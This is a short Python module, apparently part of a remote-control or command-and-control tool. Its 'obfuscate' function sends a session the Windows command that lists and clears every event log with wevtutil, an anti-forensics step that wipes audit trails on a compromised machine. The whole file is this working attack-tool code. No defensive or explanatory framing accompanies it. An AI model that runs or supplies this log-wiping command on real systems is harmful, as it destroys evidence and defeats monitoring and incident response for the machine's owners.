from domestic.parse.error_exception_handling import *
from domestic.utility.validate_dict_key import *
from domestic.session.session_message import *


@error_exception_handling
def obfuscate(message):
  logs = validate_dict_key(message, 'logs')

  if logs:
    message['message'] = 'for /f %x in (\'wevtutil el\') do wevtutil cl "%x"'
    del message['logs']
    session_message(message)
  else:
    raise Exception('Error message')